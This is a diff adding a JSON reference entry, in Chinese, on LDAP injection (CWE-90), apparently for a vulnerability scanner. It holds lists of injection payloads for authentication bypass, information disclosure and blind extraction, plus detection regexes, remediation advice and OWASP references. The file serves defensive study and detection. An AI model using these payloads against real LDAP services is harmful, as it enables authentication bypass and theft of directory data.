@@ -1,0 +1,57 @@
+{
+    "ldap_injection": {
+        "name": "LDAP注入",
+        "cwe_id": "CWE-90",
+        "cvss_base_score": 7.5,
+        "description": "LDAP注入漏洞允许攻击者通过操纵LDAP查询语句来绕过认证或获取敏感信息",
+        "impact": "认证绕过、信息泄露、权限提升、数据篡改",
+        "payloads": {
+            "authentication_bypass": [
+                "*)(&",
+                "*)(uid=*",
+                "*)(userPassword=*",
+                "admin*))%00",
+                "*))%00",
+                "*)(&(password=*",
+                "*))(|(password=*"
+            ],
+            "information_disclosure": [
+                "*)(&(objectClass=*)",
+                "*)(cn=*",
+                "*)(mail=*",
+                "*)(&(objectClass=user)(cn=*",
+                "*)(|(cn=*)(sn=*"
+            ],
+            "blind_ldap": [
+                "*)(&(password={0}))",
+                "*)(&(objectClass=*)(cn={0}))",
+                "*)(|(cn={0}*)(sn={0}*))"
+            ]
+        },
+        "detection_patterns": [
+            "ldap_search\\s*\\(.*\\+.*\\)",
+            "ldap_bind\\s*\\(.*\\+.*\\)",
+            "search\\s*\\(.*filter.*\\+.*\\)",
+            "query\\s*=.*\\+.*",
+            "WHERE.*cn.*=.*\\+"
+        ],
+        "safe_patterns": [
+            "ldap_escape",
+            "使用参数化查询",
+            "使用LDAP过滤器转义函数"
+        ],
+        "remediation": [
+            "使用参数化LDAP查询",
+            "对所有用户输入进行LDAP转义",
+            "使用白名单验证用户输入",
+            "实施最小权限的LDAP账户",
+            "使用LDAP过滤器而非直接拼接",
+            "实施输入验证和过滤"
+        ],
+        "references": [
+            "https://owasp.org/www-community/attacks/LDAP_Injection",
+            "https://cwe.mitre.org/data/definitions/90.html",
+            "https://portswigger.net/web-security/ldap-injection"
+        ]
+    }
+}
